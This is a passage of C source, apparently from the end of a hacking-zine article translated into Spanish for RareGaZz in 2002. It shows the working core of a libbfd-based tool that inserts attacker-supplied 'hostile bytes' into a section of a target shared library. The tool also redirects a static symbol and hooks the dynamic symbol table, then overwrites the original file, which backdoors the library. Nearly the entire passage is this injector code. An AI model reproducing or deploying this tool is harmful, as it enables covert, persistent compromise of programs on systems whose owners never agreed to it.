+		   bfd_section_name(ibfd, isection));
+
+  	if (osection == NULL)
+		fatal("making section");
+
+	if (isdone) vma_offset = bd_size;
+
+	if (isdest) {
+  		if (!bfd_set_section_size(obfd, osection,
+			bfd_section_size(ibfd, isection)+bd_size))
+			bfd_fatal("setting size");
+		isdone = 1;
+	} else {
+  		if (!bfd_set_section_size(obfd, osection,
+			bfd_section_size(ibfd, isection)))
+			bfd_fatal("setting size");		
+	}
+
+  	vma = bfd_section_vma (ibfd, isection) + vma_offset;
+  	if (!bfd_set_section_vma(obfd, osection, vma))
+		fatal("setting vma");
+
+  	osection->lma = isection->lma + vma_offset;
+
+  	if (bfd_set_section_alignment(obfd, osection,
+		bfd_section_alignment(ibfd, isection)) == false)
+		fatal("setting alignment");
+
+  	flags = bfd_get_section_flags(ibfd, isection);
+  	if (!bfd_set_section_flags(obfd, osection, flags))
+		bfd_nonfatal("setting flags");
+
+  	isection->output_section = osection;
+  	isection->output_offset = 0;
+
+  	if (!bfd_copy_private_section_data(ibfd, isection, obfd, osection))
+		fatal("setting private data");
+
+  	return;
+}
+
+
+void copy_section(bfd *ibfd, sec_ptr isection, bfd *obfd)
+{
+  	struct section_list *p;
+  	arelent **relpp;
+  	long relcount;
+  	sec_ptr osection;
+  	bfd_size_type size;
+      	long relsize;
+	int isdest = 0;
+  	char **matching;
+
+	if (!strcmp(output_section, isection->name)) isdest = 1;	
+
+  	osection = isection->output_section;
+  	size = bfd_get_section_size_before_reloc(isection);
+  	if (size == 0 || osection == 0 || bd_size == 0)
+    		return;
+
+  	if (bfd_get_section_flags(ibfd, isection) & SEC_HAS_CONTENTS)
+    	{
+      		PTR memhunk = (PTR)xmalloc((unsigned) size);
+      		if (!bfd_get_section_contents(ibfd, isection, 
+				memhunk, (file_ptr) 0, size))
+	  		nonfatal ("get_contents");
+
+		if (isdest) {
+
+	      		PTR bdhunk = (PTR)xmalloc((unsigned)size+bd_size);
+
+			printf("Inserting %i hostile bytes into %s\n",
+			bd_size, osection->name);
+
+			bcopy(memhunk, bdhunk, size);
+
+      			if (!bfd_get_section_contents(bd_bfd, bdsection, 
+					bdhunk+size, 0, bd_size))
+	  			bfd_nonfatal ("get_contents");
+
+	      		if (!bfd_set_section_contents(obfd, osection, 
+					bdhunk, (file_ptr) 0, size+bd_size))
+	  			bfd_nonfatal("set_contents");
+      			free (bdhunk);
+		} else {
+			if (!strcmp(osection->name, DYNSTAB)) {
+				printf("Entering %s\n", osection->name);
+				hook_dynstab(memhunk, size);
+			}
+      			if (!bfd_set_section_contents(obfd, osection, 
+					memhunk, (file_ptr) 0, size))
+	  			bfd_nonfatal("set_contents");
+    		}
+		free (memhunk);
+	}
+}
+
+
+void copy_object(bfd *ibfd, bfd *obfd)
+{
+	long start;
+  	long symcount, i;
+      	long symsize;
+	char **matching;
+	asymbol **symtab;
+
+  	start = bfd_get_start_address(ibfd);
+
+  	if (!bfd_set_format (obfd, bfd_get_format(ibfd)))
+      		nonfatal ("set_format");
+
+	bd_bfd = bfd_openr(input_filename, "i586-pc-linux-gnulibc1");
+	if (!bd_bfd) bfd_fatal("bfd_openr");
+  	bfd_check_format_matches(bd_bfd, bfd_object, &matching);
+	bdsection = bfd_get_section_by_name(bd_bfd, input_section);
+	if (!bdsection) bfd_fatal("bfd_section");
+	bd_size = bfd_section_size(bd_bfd, bdsection);
+	if (!bd_size) bfd_fatal("section_size");
+
+  	if (!bfd_set_start_address (obfd, start) || 
+	    !bfd_set_file_flags(obfd,(bfd_get_file_flags(ibfd)
+	    & bfd_applicable_file_flags(obfd))))
+    	{
+      		bfd_fatal("set_file_flags");
+    	}
+
+  	if (!bfd_set_arch_mach(obfd, bfd_get_arch (ibfd),
+	    	bfd_get_mach (ibfd)))
+    	{
+      		fprintf (stderr,
+	       		"Output file cannot represent architecture %s\n",
+	       		bfd_printable_arch_mach (bfd_get_arch(ibfd),
+					bfd_get_mach(ibfd)));
+    	}
+  	if (!bfd_set_format (obfd, bfd_get_format(ibfd)))
+      		nonfatal ("set_format");
+
+  	bfd_map_over_sections(ibfd, (void *)setup_section, obfd);
+
+      	symsize = bfd_get_symtab_upper_bound(ibfd);
+      	if (symsize < 0) nonfatal("get_symtab");
+
+      	symtab = (asymbol **)xmalloc(symsize);
+      	symcount = bfd_canonicalize_symtab(ibfd, symtab);
+      	if (symcount < 0) nonfatal("canon_symtab");
+
+	printf("Scanning %i symbols\n", symcount);
+        for(i=0;i<symcount;i++)
+                if (symtab[i]->value == hooksym) {
+                        symtab[i]->value = hookval;     
+			printf("Static symbol \"%s\" =+ %x\n",
+				symtab[i]->name, symtab[i]->value);
+			break;
+	}       
+
+  	bfd_set_symtab(obfd, symtab, symcount);
+
+  	bfd_map_over_sections(ibfd, (void *)copy_section, obfd);
+
+  	if (!bfd_copy_private_bfd_data (ibfd, obfd))
+		fatal("bfd_copy_private_bfd_data");
+}
+
+main(int argc, char *argv[])  
+{
+  	bfd *ibfd;
+  	char **matching;
+	char *output_filename;
+
+	input_filename = argv[1];
+	input_section = argv[2];
+	output_filename = argv[3];
+	output_section = argv[4];
+	hooksym = strtol(argv[5], NULL, 16);
+	hookval = strtol(argv[6], NULL, 16);
+
+	bfd_init();
+
+  	ibfd = bfd_openr(output_filename, "i586-pc-linux-gnulibc1");
+  	if (ibfd == NULL)
+  	{
+  		bfd_nonfatal("openr");
+ 	}
+
+  	if (bfd_check_format_matches(ibfd, bfd_object, &matching))
+  	{
+      		bfd *obfd;
+
+      		obfd = bfd_openw("newlib", "i586-pc-linux-gnulibc1");
+	      	if (obfd == NULL) bfd_fatal("openw");
+
+      		copy_object(ibfd, obfd);
+
+	      	if (!bfd_close(obfd)) bfd_fatal("close");
+      		if (!bfd_close(ibfd)) bfd_fatal("close");
+
+ 		execl("/bin/mv", "/bin/mv", "newlib", 
+			output_filename, NULL);
+
+    	} else {
+      		bfd_fatal("format_matches");
+	}
+}
+<-->
+
+
+|EOF|-------------------------------------------------------------------------|
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
